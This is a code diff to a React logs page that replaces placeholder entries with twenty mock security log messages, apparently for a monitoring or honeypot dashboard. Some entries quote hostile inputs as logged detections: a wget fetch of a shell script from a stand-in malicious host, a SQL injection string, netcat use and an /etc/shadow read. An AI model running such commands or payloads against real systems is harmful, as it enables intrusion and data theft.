@@ -23,27 +23,148 @@ export default function Logs() {
     useEffect(() => {
         const fetchLogs = async () => {
             const mockLogs = [
-                { id: "1", timestamp: "2025-03-19T04:50:39Z", source: "mysqld", host: "ubuntu-bionic", message: "test" },
-                { id: "2", timestamp: "2025-03-19T04:52:10Z", source: "firewall", host: "ubuntu-bionic", message: "test" },
-                { id: "3", timestamp: "2025-03-19T04:55:22Z", source: "auth", host: "ubuntu-bionic", message: "test" },
-                { id: "4", timestamp: "2025-03-19T05:01:00Z", source: "syslog", host: "ubuntu-bionic", message: "test" },
-                { id: "5", timestamp: "2025-03-19T05:03:15Z", source: "nginx", host: "web-server-01", message: "test" },
-                { id: "1", timestamp: "2025-03-19T04:50:39Z", source: "mysqld", host: "ubuntu-bionic", message: "test" },
-                { id: "2", timestamp: "2025-03-19T04:52:10Z", source: "firewall", host: "ubuntu-bionic", message: "test" },
-                { id: "3", timestamp: "2025-03-19T04:55:22Z", source: "auth", host: "ubuntu-bionic", message: "test" },
-                { id: "4", timestamp: "2025-03-19T05:01:00Z", source: "syslog", host: "ubuntu-bionic", message: "test" },
-                { id: "5", timestamp: "2025-03-19T05:03:15Z", source: "nginx", host: "web-server-01", message: "test" },
-                { id: "1", timestamp: "2025-03-19T04:50:39Z", source: "mysqld", host: "ubuntu-bionic", message: "test" },
-                { id: "2", timestamp: "2025-03-19T04:52:10Z", source: "firewall", host: "ubuntu-bionic", message: "test" },
-                { id: "3", timestamp: "2025-03-19T04:55:22Z", source: "auth", host: "ubuntu-bionic", message: "test" },
-                { id: "4", timestamp: "2025-03-19T05:01:00Z", source: "syslog", host: "ubuntu-bionic", message: "test" },
-                { id: "5", timestamp: "2025-03-19T05:03:15Z", source: "nginx", host: "web-server-01", message: "test" },
-                { id: "1", timestamp: "2025-03-19T04:50:39Z", source: "mysqld", host: "ubuntu-bionic", message: "test" },
-                { id: "2", timestamp: "2025-03-19T04:52:10Z", source: "firewall", host: "ubuntu-bionic", message: "test" },
-                { id: "3", timestamp: "2025-03-19T04:55:22Z", source: "auth", host: "ubuntu-bionic", message: "test" },
-                { id: "4", timestamp: "2025-03-19T05:01:00Z", source: "syslog", host: "ubuntu-bionic", message: "test" },
-                { id: "5", timestamp: "2025-03-19T05:03:15Z", source: "nginx", host: "web-server-01", message: "test" },
+                {
+                    id: "1",
+                    timestamp: "2025-03-19T04:50:39Z",
+                    source: "mysqld",
+                    host: "db-server-01",
+                    message: "Access denied for user 'admin'@'192.168.1.13' (using password: YES)"
+                },
+                {
+                    id: "2",
+                    timestamp: "2025-03-19T04:52:10Z",
+                    source: "firewall",
+                    host: "edge-router",
+                    message: "Blocked incoming connection from 185.12.89.22 to port 22"
+                },
+                {
+                    id: "3",
+                    timestamp: "2025-03-19T04:55:22Z",
+                    source: "auth",
+                    host: "ubuntu-bionic",
+                    message: "Failed password for invalid user root from 91.204.100.25 port 50122 ssh2"
+                },
+                {
+                    id: "4",
+                    timestamp: "2025-03-19T05:01:00Z",
+                    source: "syslog",
+                    host: "honeypot-node-2",
+                    message: "Suspicious bash command detected: wget http://malicious.site/shell.sh"
+                },
+                {
+                    id: "5",
+                    timestamp: "2025-03-19T05:03:15Z",
+                    source: "nginx",
+                    host: "web-server-01",
+                    message: "GET /login.php?id=' OR '1'='1 HTTP/1.1 - 403 Forbidden - Possible SQL Injection"
+                },
+                {
+                    id: "6",
+                    timestamp: "2025-03-19T05:04:59Z",
+                    source: "cron",
+                    host: "internal-api",
+                    message: "Cron job '/usr/bin/python3 /opt/scripts/check_integrity.py' completed successfully"
+                },
+                {
+                    id: "7",
+                    timestamp: "2025-03-19T05:07:31Z",
+                    source: "auth",
+                    host: "honeypot-node-3",
+                    message: "Accepted publickey for user 'analyst' from 10.0.2.15 port 45210 ssh2"
+                },
+                {
+                    id: "8",
+                    timestamp: "2025-03-19T05:09:12Z",
+                    source: "nginx",
+                    host: "web-server-01",
+                    message: "POST /contact-form.php - Payload length exceeded 10KB - Blocked"
+                },
+                {
+                    id: "9",
+                    timestamp: "2025-03-19T05:12:20Z",
+                    source: "firewall",
+                    host: "edge-router",
+                    message: "Multiple port scan attempts detected from 83.97.17.3"
+                },
+                {
+                    id: "10",
+                    timestamp: "2025-03-19T05:13:45Z",
+                    source: "syslog",
+                    host: "honeypot-node-2",
+                    message: "Process '/bin/nc' executed with elevated privileges by unknown user"
+                },
+                {
+                    id: "11",
+                    timestamp: "2025-03-19T05:15:01Z",
+                    source: "auth",
+                    host: "ubuntu-bionic",
+                    message: "User 'www-data' attempted to access restricted directory '/etc/shadow'"
+                },
+                {
+                    id: "12",
+                    timestamp: "2025-03-19T05:16:45Z",
+                    source: "nginx",
+                    host: "web-server-01",
+                    message: "GET /admin/config.php - 401 Unauthorized"
+                },
+                {
+                    id: "13",
+                    timestamp: "2025-03-19T05:17:32Z",
+                    source: "firewall",
+                    host: "edge-router",
+                    message: "Blocked outbound connection to known C2 domain: c2.badnet.xyz"
+                },
+                {
+                    id: "14",
+                    timestamp: "2025-03-19T05:19:10Z",
+                    source: "mysqld",
+                    host: "db-server-01",
+                    message: "User 'backup' accessed table 'users' from IP 172.16.0.4"
+                },
+                {
+                    id: "15",
+                    timestamp: "2025-03-19T05:21:04Z",
+                    source: "syslog",
+                    host: "honeypot-node-1",
+                    message: "Detected base64 encoded payload in POST to /upload"
+                },
+                {
+                    id: "16",
+                    timestamp: "2025-03-19T05:22:28Z",
+                    source: "auth",
+                    host: "honeypot-node-3",
+                    message: "User 'guest' failed login 5 times - temporary lockout triggered"
+                },
+                {
+                    id: "17",
+                    timestamp: "2025-03-19T05:23:17Z",
+                    source: "nginx",
+                    host: "web-server-01",
+                    message: "HEAD /wp-login.php - 404 Not Found - Possible bot probe"
+                },
+                {
+                    id: "18",
+                    timestamp: "2025-03-19T05:24:41Z",
+                    source: "cron",
+                    host: "internal-api",
+                    message: "Scheduled cleanup of temp files completed - 117 files deleted"
+                },
+                {
+                    id: "19",
+                    timestamp: "2025-03-19T05:26:00Z",
+                    source: "firewall",
+                    host: "edge-router",
+                    message: "Geo-IP block triggered for IP 202.108.0.1 (CN)"
+                },
+                {
+                    id: "20",
+                    timestamp: "2025-03-19T05:27:50Z",
+                    source: "syslog",
+                    host: "honeypot-node-2",
+                    message: "Unusual outbound DNS request to unknown domain: uj3xg4.onion"
+                }
             ];
+
             setLogs(mockLogs);
             setFilteredLogs(mockLogs);
         };
